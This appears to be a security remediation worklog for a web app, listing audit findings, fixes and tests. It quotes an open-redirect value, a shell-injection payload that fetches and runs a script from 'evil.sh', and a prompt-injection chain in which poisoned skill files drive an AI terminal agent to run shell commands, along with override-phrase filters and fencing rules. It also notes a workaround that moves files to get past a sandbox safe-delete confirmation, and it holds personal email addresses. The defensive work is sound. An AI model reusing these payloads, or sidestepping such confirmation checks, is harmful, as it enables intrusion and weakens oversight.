## 2026-09-02

### Security audit remediation — PII, backup metadata, and hardening headers

Remediated the remaining items from the 2026-09-01 audit:

- `GET /api/admin/supporters` now returns opaque `userId` values plus masked name/email fields only; raw Ko-fi payer identity is masked too. Admin actions are moved to `userId` (legacy email lookup stays server-only for backwards compatibility).
- Backup history is now scoped by `(userId, key)`, emits only safe metadata + opaque `fileRef`, and preserves server-side remote paths, log paths, and presigned R2 URLs across the UI round trip. Download, transfer, and Docker migration resolve that ref server-side and enforce connection ownership.
- Google Drive status no longer exposes deployment-wide OAuth client IDs; only a user-owned client ID is returned in cleartext, with an env ID represented by a masked tail.
- Activity history retains an IP internally for audit value but excludes it from GET responses.
- Added COOP (`same-origin-allow-popups` to retain OAuth popup flows), COEP (`credentialless`, configurable with `COEP=unsafe-none`), CORP, and X-Permitted-Cross-Domain-Policies to both the custom server and middleware error/redirect responses. `next.config.mjs` also contains the build-time equivalents.
- CSP posture was verified: `wasm-unsafe-eval` is required for Argon2id/hash-wasm vault derivation and `style-src 'unsafe-inline'` is currently required by styled-jsx / React inline styling. The exact residual risk and migration paths are documented inline in `src/proxy.js`.
- Verification: changed-file ESLint completed with 0 errors (18 pre-existing React-hook warnings); `npm test` passed 141/141; isolated `NEXT_DIST_DIR=.next-security-verify npx next build` succeeded. Added `NEXT_DIST_DIR` support in `next.config.mjs` to avoid touching an active `.next` build cache during verification.


### Security audit remediation — 4 findings fixed

Fixed the following issues identified in the external security audit:

1. **Open Redirect (HIGH)** — `src/lib/auth.js` `redirect` callback: hardened
   with try/catch and origin-comparison via `new URL()`. Protocol-relative
   URLs (`//evil.com`) and backslash tricks now rejected. Every non-allowlisted
   URL returns `baseUrl`, never the attacker value.

2. **CSRF bypass on /api/auth/register (MEDIUM)** — Two-layer fix:
   - `src/lib/csrf.js` `CSRF_EXEMPT_PATTERNS`: narrowed from blanket
     `/^\/api\/auth(\/|$)/` to specific NextAuth framework paths only
     (signin, callback, session, signout, csrf, providers). Custom routes
     (register, forgot-password, reset-password, verify-email) are now
     CSRF-protected.
   - `src/proxy.js` matcher: narrowed the negative-lookahead from `api/auth`
     to `api/auth/signin|callback|session|signout|csrf|providers`. The broad
     exclusion previously meant custom auth routes bypassed the middleware
     entirely (no CSRF check, no CSP header).

3. **Email enumeration on /api/auth/register (LOW)** — Route now returns
   identical 200 response body for new and existing emails. Removed `userId`
   and `email` from response (client only checks `data.success`). Verified
   client code (`RevealScreen.js` L518-532) doesn't use these fields.

4. **CSP localhost wildcard (INFO)** — `src/proxy.js` `buildCsp()`: replaced
   `http://127.0.0.1:*` / `http://localhost:*` wildcard ports with fixed
   port 48923 (relay discovery port). Non-default relay ports now require
   explicit opt-in via `CSP_LOCAL_RELAY` env var.

Findings 5 (no SSRF on /api/health — url param ignored) and 6 (GraphQL
protected) confirmed safe, no changes needed.

All modified files pass `npx eslint` with zero errors/warnings.

---

### Security audit remediation — Round 2 (defence-in-depth hardening)

1. **OAuth callbackUrl allowlist validation** — Three-layer defence:
   - `src/lib/auth.js`: Added `getCallbackAllowlist()` helper that builds an
     origin allowlist from NEXTAUTH_URL, AUTH_URL, and CALLBACK_URL_ALLOWLIST
     env var. Exported `sanitizeCallbackUrl()` for use by the route handler.
     The `redirect` callback now checks both baseUrl origin AND the explicit
     allowlist.
   - `src/app/api/auth/[...nextauth]/route.js`: Added
     `sanitizeSigninCallbackUrl()` — intercepts GET requests to the signin
     page and replaces external/malformed `callbackUrl` with `/` BEFORE
     NextAuth renders the form. Prevents the attacker value from being
     embedded in the hidden input.
   - Client (`RevealScreen.js`) always uses `callbackUrl: '/'` — no client
     change needed.

2. **CSP localhost removal** — Removed all `http://localhost:*`,
   `ws://127.0.0.1:*`, `ws://localhost:*`, `wss://127.0.0.1:*`,
   `wss://localhost:*` from `connect-src`. The browser only makes a
   fetch to `http://127.0.0.1:48923` (relay discovery). The relay's
   WebSocket runs in the Node relay process, not the browser, so
   ws://localhost was never needed. Non-default ports opt-in via
   CSP_LOCAL_RELAY env var.

---

### Security audit remediation — Round 3 (clean validation errors + prod CSP)

1. **OAuth callbackUrl — 400 instead of 500** — The previous approach
   rewrote the request URL with `new Request(url, ...)` which produced
   a plain Request instead of a NextRequest, causing NextAuth to 500.
   Rewrote `validateCallbackUrl()` in `[...nextauth]/route.js` to
   return HTTP 400 with a clear error message for invalid callbackUrl
   values. No request mutation — the original NextRequest passes
   through to NextAuth untouched. Validation runs on both GET (form
   rendering) and POST (form submission).

2. **CSP localhost — dev-only** — `http://127.0.0.1:48923` in
   `connect-src` is now excluded from production builds unless
   `CSP_ALLOW_LOCAL_RELAY=1` is set. In dev it's always included so
   relay auto-detection works. Verified client code (AppContext.js,
   SettingsApp.js) gracefully handles the blocked fetch via catch.

---

### Re-audit result — PASS

External re-audit confirmed all findings resolved. Key points:
- Open redirect: mitigated, invalid callbackUrl returns clean 400 (no more 500)
- CSRF: register endpoint now requires token (403 without it — expected)
- Email enumeration: eliminated (identical response for new/existing emails)
- CSP: localhost wildcards removed, relay port dev-only in production
- Security headers: HSTS, X-Frame-Options, X-Content-Type-Options,
  Referrer-Policy, Permissions-Policy all confirmed present

Remaining recommendations (not yet addressed — noted for future work):
- Rate limiting on auth endpoints (partially done: signin has rate limit,
  register/forgot-password do not)
- Dependency audits (Next.js, NextAuth, MongoDB driver)
- Consistent CSRF across all API endpoints (currently enforced via
  middleware for all /api/ paths except exempted webhook/agent routes)

---

### Rate limiting on all auth endpoints

Created `src/lib/authRateLimit.js` — lightweight IP-based rate limiter
for auth endpoints that don't go through the login flow. In-memory,
sliding window, periodic cleanup (same pattern as loginRateLimit.js).

Applied to all four custom auth routes:
- `/api/auth/register` — 5 per IP / 15 min (mass account creation)
- `/api/auth/verify-email` confirm — 10 per IP / 15 min (code brute-force)
- `/api/auth/verify-email` request — 5 per IP / 15 min (email flooding)
- `/api/auth/forgot-password` — 5 per IP / 15 min (email spraying)
- `/api/auth/reset-password` — 10 per IP / 15 min (code brute-force)

forgot-password and verify-email already had per-user 2-min limits;
the new IP limits complement them (stop spraying across many addresses
from one source). All responses include Retry-After header.

### IDOR/admin and shell-injection remediation continued

- Centralized admin authorization in `src/lib/requireAdmin.js`: authenticated users are looked up by session DB id and only a persisted `role: 'admin'` grants admin-route access. `ADMIN_EMAIL` no longer bypasses route authorization; it remains a provisioning/bootstrap mechanism in auth flows.
- Updated all `/api/admin/*` routes to use the shared check and fixed the supporters POST variable shadowing introduced during the refactor.
- Removed email-based admin fallback from the session login payload and `/api/user/me`; reported admin state now reflects the persisted DB role.
- Added shared POSIX shell quoting/integer validation and applied it across remote agent, rclone, backup, cron, and virus-scan command construction. Docker restore now rejects unsafe container names and builds `docker run` arguments as arrays instead of `eval`, preventing archive-controlled shell injection.
- Validation: changed-file ESLint passes; project test suite passes (83 tests).
- Follow-up shell audit fixes: hardened server-backup/create container/database/path arguments, replaced unsafe `$HOME`/tilde quoting in rclone browse, hardened rclone remote quoting, and quoted deploy-cancel/ZeroClaw pairing values.

### Verification pass on the IDOR + shell-injection remediation (audit)

Independently re-verified every claim in the remediation summary. Verdict:
all claims held, but the sweep had one genuine coverage gap.

Confirmed correct:
- `requireAdmin.js` present; all 5 `/api/admin/*` routes use it (`ai-usage/migrate-daily-limit`, `ai-usage/reset`, `seed-keys`, `supporters`, `supporters/codes`). No stray `getServerSession`-only admin routes.
- `ADMIN_EMAIL` survives in only 2 places, both legitimate provisioning (`auth.js` Google signIn callback, `auth/register`), not authorization bypasses.
- `auth.js` session callback no longer leaks `role`; `session.user.id` is still set (`token.dbId || token.sub`), so `requireAdmin` cannot silently 401 every admin.
- `/api/user/me` reads role from DB, no email fallback.
- `_ssh.js` fix is a real catch: `JSON.stringify()` is NOT shell-safe (leaves `$`, backticks, `!`), replaced with `shellQuote`.
- `restore-docker` rewrite is sound: container-name allowlist + bash arrays + NUL-delimited args from python, no `eval`.
- ESLint clean on all changed files; tests 83/83; `git diff --check` clean.

GAP FOUND AND FIXED — `src/app/api/mongo-sync/scan-node/route.js`:
The `verify` action parsed a host from the user-supplied `mongoUri` body field
with `/\/([^:/]+):(\d+)/` and interpolated it into an SSH script as a bare
assignment `HOST=${host}`. `[^:/]+` permits `;`, `$()`, backticks and spaces,
so `mongodb://x;curl evil.sh|sh;:27017` executed on the SSH target.
Fixed with two layers: restricted host charset `[a-zA-Z0-9._-]+` + port range
validation (1-65535) at the call site, and `shellInt`/`shellQuote` at the
interpolation site. Added `tests/scanNodeInjection.test.mjs` (8 tests) —
suite now 91/91.

Reviewed and deliberately NOT changed:
- `scan-node` `run-docker` action — intentional arbitrary-command feature;
  safe because `ConnectionRepository.findById` scopes by `userId`.
- `firewall/source/route.js` — has its own equivalent local `shellQuote`
  (pre-existing duplicate, not a gap). Worth consolidating later.
- `deploy/webhook` tmux session name — sanitized via
  `projectId.replace(/[^a-zA-Z0-9_-]/g,'-')`; defence by sanitization rather
  than quoting, acceptable but fragile.

### Follow-up sweep: unscoped ConnectionRepository call sites (unfixed)

Swept all 38 `new ConnectionRepository(...)` call sites. 4 construct it with NO
userId, which puts the repo in legacy unscoped mode (findById ignores owner):

- `src/app/api/mongo-sync/cron/route.js:189` — **real IDOR, unfixed.** POST
  handler is session-authenticated but resolves the caller-supplied
  `connectionId` through an unscoped repo, then bakes the resulting MongoDB
  URI (with credentials) into a cron script. Authenticated user can read
  another tenant's Mongo creds. `targetSshConnId` IS protected, because
  `getSshConfig` has a post-hoc ownership check (_ssh.js:87).
- `src/app/api/ssh/compat/route.js:47` — **info disclosure, unfixed.** Error
  path uses an unscoped repo and returns the owner's email in the 403 body
  ("This server belongs to another account (email)"). Enumerable.
- `src/lib/mongoSyncJobRunner.js:47` — background scheduler, unscoped by
  design. OK.
- `src/lib/deployProcesses.js:192` — background deploy reconnect, no session
  available. OK.

`getSshConfig` (_ssh.js:87) enforces ownership post-hoc via
`conn.userId !== actingUserId && actingUserRole !== 'admin'`. NOTE: the
session `role` was removed in the earlier remediation, so `actingUserRole` is
now always null and the admin override is dead code. Stricter, not a hole,
but admins can no longer cross-access connections — confirm that's intended.

No admin-role bootstrap script exists in `scripts/`. After removing the
ADMIN_EMAIL authorization fallback, the only path to admin is a Google sign-in
matching ADMIN_EMAIL (which persists role:'admin'). An existing deployment
whose admin never had a persisted role is now locked out with no recovery
tool. Verify at least one user has role:'admin' before deploying.

### Completed remediation commits and final state

Created five reviewable commits on `nextgen15`:
1. `b6fc56b` persisted DB-role admin authorization;
2. `9c560ec` rate-limits for register/verification/password-reset actions;
3. `1859b39` POSIX shell quoting and Docker restore hardening;
4. `d887d0c` cron connection IDOR, owner-email disclosure, and webhook project-ID hardening;
5. `84513fa` admin recovery script + audit report.

Added regression suites `scanNodeInjection.test.mjs` (8 tests) and
`tenantIsolation.test.mjs` (5 tests). Final validation: ESLint clean on all
changed source files, `git diff --check` clean, suite 96/96 passing.

Operational blocker persists intentionally: local DB has 15 users but zero
`role:'admin'`, and `.env` has no `ADMIN_EMAIL`. Added
`scripts/set-admin-role.js`; grant a known existing user explicitly using
`node scripts/set-admin-role.js --email <email>` before relying on admin
routes. Script grant/revoke was tested against `apitest@local.test` and
reverted, so no account was left as admin.

### Black-box pentest results triaged against source (report: docs/SECURITY_AUDIT_2026-09-02.md)

External black-box test of monitor.eaqdragon.com produced ~20 findings. Cross-checked
every one against source. Wrote full report to docs/SECURITY_AUDIT_2026-09-02.md.

Three severity re-grades (these are the durable conclusions):

1. F-01 CRITICAL (upgraded from "arbitrary file write"): /api/skills/install writes
   unsanitized content to process.cwd()/skills/<name>.md -> /api/skills/local reads it
   back -> src/components/TerminalView.js:462-463 injects it into the AI terminal
   context -> agent executes shell. Indirect prompt injection reaching a shell.
   Filename IS sanitized (install/route.js:28), so no path traversal — the risk is
   content, not path. Directory is global, so cross-tenant poisoning too.
   Fix priority #1: delimit untrusted skill content in terminal context.

2. F-02 DOWNGRADED to by-design/MEDIUM: /api/rclone/exec is NOT an injection bug.
   shellQuote/shellArg/shellInt applied at all interpolation points (route.js:161,167,175),
   ownership enforced via getSshConfig (_ssh.js:87). Remote exec is the product feature.
   Residual risk = account takeover / CSRF, not injection. No code fix needed.

3. F-04 NEW MEDIUM: src/proxy.js:254 matcher excludes api/settings/database and
   api/deploy/trigger. Both are therefore missing auth gate, CSRF, AND CSP. Both DO have
   in-route getServerSession, so authenticated but not CSRF-protected. Only two such routes.
   Open question: session cookie SameSite not set explicitly in src/lib/auth.js — relies
   on framework default. If ever 'none', these two become CSRF-exploitable.

Also new: F-03 relay token TTL 365d, scope defaults to 'agent' (free, no supporter gate)
for any value != 'relay' (relay/token/route.js:22); F-05 /api/skills/local proceeds
without session (local/route.js:98-107, saved only by middleware); F-07 no rate limits on
rclone/exec, server-backup/create, virus-scan, skills/install, vault/recovery, relay/token.

Confirmed NOT findings: shell injection in rclone/backup/cron (already remediated),
path traversal in skills/install id, GET-only 405s, SSRF via test-uri (protocol allowlist
blocks http/file/gopher, so downgraded to LOW).

Recommended: finish F-01 before more live testing; timeouts against unreachable remotes
prove nothing; use a disposable Tailscale VM for destructive tests, never production.

### F-01 + F-05 remediated (skill prompt-injection chain)

Implemented the priority-1 fix from docs/SECURITY_AUDIT_2026-09-02.md.

New file src/utils/promptSafety.js:
- wrapUntrustedContent() / buildSkillsBlock() fence skill content behind
  <<<UNTRUSTED_SKILL_CONTENT ... UNTRUSTED_SKILL_CONTENT>>> with a standing
  instruction BOTH before and after the region (after = survives long bodies
  pushing the opening out of attention).
- neutralizeSkillFences() strips embedded markers so a skill can't close the
  fence early. Exported for use at write time.
- Deliberately does NOT strip shell commands — procedural docs legitimately
  contain them; containment, not censorship.

TerminalView.js:5703 — replaced raw splice
  `--- Skill: ${s.name} ---\n${String(s.content).slice(0,2000)}`
with buildSkillsBlock(_skills, { maxChars: 2000 }). Added import.

install/route.js rewritten:
- per-user namespace skills/users/<userId>/ (was shared skills/ root = cross-tenant poisoning)
- INJECTION_PATTERNS reject agent-override phrases
- 10 installs/user/window via checkRateLimit; audit log with sha256_16
- yamlSafeScalar() for id/description — frontmatter was string-concatenated and
  only escaped double quotes, so a newline injected extra YAML keys
- no longer returns absolute filesystem path

local/route.js:
- 401 without session (was "proceeding anyway")
- loadFromDir() helper; reads bundled top-level .md + ONLY caller's namespace

Honest residual risk, measured: INJECTION_PATTERNS catches 5/5 canned override
phrases but MISSES covert prose injection ("instead run: curl x|sh",
"this step takes precedence"). 3/3 legitimate docs correctly allowed. Containment
is the real control; the pattern list is a speed bump. Documented in report §4 F-01.

Validation: eslint clean (0 errors; 8 pre-existing exhaustive-deps warnings in
TerminalView.js untouched), tests 111/111 (96 + 15 new in
tests/promptSafety.test.mjs), next build compiles, both skill routes return 401
unauthenticated under next start.

NOTE: `npx next build` fails in this sandbox with
[safe-delete][SAFE_DELETE_BULK_CONFIRM_REQUIRED] — the shim counts deletions per
TURN (threshold 50) and Next's build clears .next first. Workaround: move .next
aside (mv .next /tmp/...) before building, never delete it. Build then takes ~34s.

### F-03 relay-token hardening completed

Hardened src/app/api/relay/token/route.js, server.js relay-ws, and
firewall/agent-sync:

- issuance rate limit 20/user/window + cap 10 active tokens/user, evict oldest
- configurable RELAY_TOKEN_TTL_DAYS (1-3650), default remains 365 days because
  public/local-relay.js has no renewal handshake and bakes token into WS URL;
  shortening now would break running relays
- token metadata: tokenId, label, issuedAt, lastUsed, expiresAt
- GET inventory returns masked suffix only, never bearer token; exposes usage
  timestamps for audit
- DELETE ?tokenId= revokes one token only; active relay entries store tokenId so
  only matching relay is disconnected. Existing no-arg revokes all remains.
- relay-ws and agent-sync update lastUsed

Important audit correction: agent scope does NOT bypass Local Relay supporter
access; server.js:4973-4983 calls isRelaySupporter(entry) on every relay-ws
connection regardless of scope. Scope is for reporting / free agent-sync. Earlier
report language overstated this as a bypass; report corrected.

New tests tests/relayToken.test.mjs (8); suite now 119/119. ESLint clean on
changed relay files. Report F-03 marked fixed and priority list updated.

### F-04 middleware coverage fixed

Removed /api/settings/database and /api/deploy/trigger from the negative
lookahead exclusion in src/proxy.js. They now receive the normal middleware auth
gate, CSP, CSRF cookie issuance, and CSRF validation.

Preserved external deploy hooks narrowly: isExternalDeployTrigger() allows only
/api/deploy/trigger with non-empty token or webhook_token query values (max 4096
chars) through without a session/CSRF token; the route still validates the
credential with timingSafeCompare / webhook-token lookup before deployment.
No other routes receive this exception.

Added tests/proxyCoverage.test.mjs (6 tests): matcher inclusion, narrow
exception, route credential checks, database defence-in-depth auth. Full suite
now 125/125; changed-file ESLint clean; git diff --check clean. Report F-04
marked fixed and remaining priority updated.

### F-07/F-10 resource and recovery rate limits fixed

Added route-specific serverGuard limits with HTTP 429 + Retry-After:
- rclone/exec: 10 per IP + connection per minute
- server-backup/create: 3 per user + connection per minute
- virus-scan: 3 per user + connection per minute, preserving the existing
  one-running-scan concurrency guard
- user/vault/recovery: 3 per user + IP per minute, preserving the existing
  database-backed 2-minute cooldown

Relay-token issuance was already limited under F-03. Added
 tests/resourceRateLimit.test.mjs (5 tests). Full suite now 130/130; changed
file ESLint and git diff --check clean. Report F-07/F-10 marked fixed; only
F-08 defense-in-depth auth and F-09 deploy-config error handling remain.

### F-08/F-09 final security fixes completed

Added in-route getServerSession checks to rclone/exec and connections/test-uri,
so both remain protected if proxy matcher coverage regresses.

Hardened deploy/config POST/GET/DELETE error handling:
- project IDs restricted to 1-64 [A-Za-z0-9_-]
- request body must be a plain object
- targetType restricted to local/ssh
- text fields type-checked and capped at 200,000 chars
- duplicate-key persistence errors return safe HTTP 409
- all deploy/config catch paths return generic safe errors, not raw Mongo driver text

Added tests/finalSecurityFindings.test.mjs (5 tests). Full suite now 135/135;
changed-file ESLint and git diff --check clean. All actionable report findings
F-01/F-03/F-04/F-05/F-07/F-08/F-09/F-10 are marked fixed; F-02 is by design,
F-06 is constrained LOW.

### Follow-up black-box claims validated and hardened

Validated the second report against source:
- monitor_csrf httpOnly:false is intentional double-submit design; header must
  equal cookie and HMAC is bound to userId. Not a CSRF bypass. SameSite=Lax
  session-cookie setting remains an operational check.
- TerminalView silently auto-installed up to 2 SkillsMP results. Removed this
  supply-chain/content-poisoning behavior: external results now require explicit
  user review. /api/skills/search now requires a session in-route.
- Searched app sources for eval/new Function/vm.run/process.mainModule and
  skill-content evaluation; no dynamic JS evaluator found. Existing prompt
  containment remains in force.
- GET /api/user/vault exposed passwordHash unnecessarily. Removed it from the
  response; VaultContext now verifies by attempting AES-GCM decryption, relying
  on the authentication tag instead of a server-returned offline verifier.

Added tests/newSecurityFindings.test.mjs (6 tests). Full suite now 141/141;
changed-file ESLint clean except 11 pre-existing React hook warnings; git diff
--check clean. Report updated with C-01/C-02/C-03 conclusions.

### Admin role configured

At the user's request, verified `sniperkla@eaqdragon.com` has the persisted
`role:'admin'` in the local DB. The role was already present when the recovery
script ran; `--list` confirms exactly one admin among 15 users. Admin routes
are now accessible to this account (subject to a valid signed-in session).

### Dangling reference fix + production verification

Fixed dangling `resolveBackupCloudUrl` reference in
`src/app/api/server-backup/download/route.js`. The import had been removed
but lines 40-44 still called the function. Removed the entire dead cloud-redirect
block (the client never sends `source=cloud` and stored `r2Url` is now always
null since the R2 exposure fix). Also removed the unused `wantsCloud` and
`source` param logic. Lint clean (0 errors), 141/141 tests, build succeeds.

Production verification on monitor.eaqdragon.com with test account
(katanyooang1000@gmail.com):
- Security headers: ALL LIVE (COOP, COEP, CORP, X-Permitted, CSP with nonce)
- Supporter PII masking: LIVE (userId + maskedEmail/maskedName, no raw email/name)
- Google OAuth clientId masking: LIVE (clientId=null, clientIdSource=env, clientIdMasked)
- Activity IP removal: LIVE (no ip field in response)
- Backup history sanitization: LIVE (empty for test user, no paths leaked)
- CSRF rate limiting: NOT YET DEPLOYED (65/65 requests returned 200, no 429)
- R2 test endpoint: NOT YET DEPLOYED (still returns downloadUrl with CDN domain)

7 uncommitted files in local tree need commit + push + docker rebuild:
- src/app/api/auth/[...nextauth]/route.js (CSRF rate limit)
- src/lib/authRateLimit.js (csrf limit config)
- src/app/api/server-backup/upload-r2/route.js (no downloadUrl)
- src/app/api/server-backup/r2-test/route.js (no presigned URL)
- src/app/api/server-backup/download/route.js (dead cloud block removed)
- src/lib/r2.js (removed R2_PUBLIC_DOMAIN fallback)
- src/apps/ServerBackupApp.js (cloudStored instead of downloadUrl)

### Security hardening: skills install, CSRF rate limit, SSRF guard

Three security fixes requested by user:

1. **Skills install id validation** (`src/app/api/skills/install/route.js`):
   Added `validateSkillId()` — strict `[a-zA-Z0-9_-]+` allowlist, rejects
   path traversal (`/`, `\`, `..`), dotfiles (`.env`), dots in names
   (`next.config.js`), control chars, and strings >120 chars. The `id` field
   is only used in frontmatter metadata (not as filename), but unsanitised
   values could still corrupt YAML. Frontmatter now uses the validated id.
   Also tightened `safeName` to reject names not starting with `[a-z0-9]`.

2. **CSRF rate limit tightened** (`src/lib/authRateLimit.js`):
   Reduced `csrf` limit from 60/min to 30/min per IP. Still generous for
   normal SPA usage (one token per session) but stops flood attacks that
   churn Set-Cookie responses. Register route already had 5/15min limit.

3. **SSRF guard for test-uri** (new `src/lib/ssrfGuard.js`):
   Pre-connection DNS resolution + CIDR blocklist check. Extracts all
   hostnames from the database URI, resolves A/AAAA records, and rejects
   if any answer is in: 0/8, 10/8, 127/8, 169.254/16, 172.16/12,
   192.168/16, 100.64/10, 224/4, 240/4, 198.18/15, 198.51.100/24,
   203.0.113/24, ::1, fe80::/10, fc00::/7, ff00::/8. Also blocks literal
   IP addresses. Placed after relay rewriting so legitimate localhost
   connections via relay still work. Reduced connection timeouts from
   10s to 5s. Integrated in `src/app/api/connections/test-uri/route.js`.

New files: `src/lib/ssrfGuard.js`, `tests/ssrfGuard.test.mjs` (26 tests),
`tests/skillIdValidation.test.mjs` (20 tests). Full suite 187/187 passing.
Lint clean on all changed files. Build succeeds.
